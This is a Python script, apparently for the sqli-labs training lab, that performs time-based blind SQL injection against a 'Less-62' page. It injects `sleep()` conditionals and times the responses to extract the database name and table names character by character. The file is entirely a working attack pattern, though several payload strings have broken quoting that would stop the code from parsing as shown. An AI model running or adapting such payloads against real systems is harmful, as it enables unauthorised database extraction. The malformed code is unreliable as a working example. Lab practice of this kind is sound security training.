import requests
import datetime


class Bool_Sql_Inject(object):
    def __init__(self):
        self.url = 'http://192.168.253.130/sql/Less-62/'

    def database_length(self):
        for i in range(1, 30):
            payload = self.url + '?id=1') and if(length(database())={},sleep(3),1)--+'.format(i)

            time_start = datetime.datetime.now()

            print(payload)
            print('正在测试第' + str(i) + '位')

            response = requests.get(url=payload)

            time_end = datetime.datetime.now()

            t = (time_end - time_start).seconds

            if t >= 2:
                print('database length is ' + str(i))
                break
            else:
                pass

    def database_name(self):
        name = ''
        for j in range(1, 20):
            for i in '0123456789abcdefghijklmnopqrstuvwxyz':
                payload = self.url + '?id=1') and if(substr((select database()),{},1)='{}',sleep(3),1) --+'.format(j, i)

                time_start = datetime.datetime.now()
                print(payload)
                print('正在测试第' + str(j) + '位')

                response = requests.get(url=payload)

                time_end = datetime.datetime.now()

                t = (time_end - time_start).seconds

                if t >= 3:
                    name += i
                    break
                else:
                    pass

        return name

    def table_count(self):
        for j in range(1, 30):
            payload = self.url + '?id=1') and if((select count(table_name) from information_schema.tables where table_schema\
            ='challenges')={},sleep(2),1) --+'.format(j)

            time_start = datetime.datetime.now()

            response = requests.get(url=payload)

            time_end = datetime.datetime.now()

            t = (time_end - time_start).seconds

            if t >= 2:
                print('table count is ' + str(j))
                break

            else:
                pass

    def table_length(self):
        x = '0'
        one = Bool_Sql_Inject()
        database_name = one.database_name()
        for i in range(1, 20):
            payload = self.url + '?id=1') and if(length((select table_name from information_schema.tables where table_schema='{}' limit 0,1))={},sleep(3),1)--+'.format(
                database_name, i)

            time_start = datetime.datetime.now()

            print(payload)
            print('正在测试第' + str(i) + '位')

            response = requests.get(url=payload)

            time_end = datetime.datetime.now()

            t = (time_end - time_start).seconds

            if t >= 3:
                print('table length is ' + str(i))
                break
            else:
                pass

        return database_name

    def table_name(self):
        one = Bool_Sql_Inject()
        database_name = one.database_name()
        name = ''
        for j in range(1, 20):
            for i in '0123456789abcdefghijklmnopqrstuvwxyz':
                payload = self.url + '?id=1') and if(substr((select table_name from information_schema.tables where table_schema='{}' limit 0,1),{},1)='{}',sleep(3),1) --+'.format(
                    database_name, j, i)
                time_start = datetime.datetime.now()
                print(payload)
                print('正在测试第' + str(j) + '位')

                response = requests.get(url=payload)

                time_end = datetime.datetime.now()

                t = (time_end - time_start).seconds

                if t >= 3:
                    name += i
                    break
                else:
                    pass

        print(name)


start = Bool_Sql_Inject()
start.table_name()
